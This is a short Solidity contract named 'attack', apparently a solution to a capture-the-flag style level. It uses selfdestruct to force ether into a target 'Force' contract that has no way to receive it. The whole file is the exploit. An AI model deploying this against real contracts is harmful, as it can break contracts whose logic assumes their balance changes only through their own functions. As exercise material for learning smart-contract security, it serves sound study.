// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract attack
{
    Force forceattack;

    constructor (Force _forceattack) public
    {
        forceattack = Force(_forceattack);
    }

    function Deposit () public payable 
    {
        address payable addr = payable(address(forceattack));
        selfdestruct(addr);
    }
}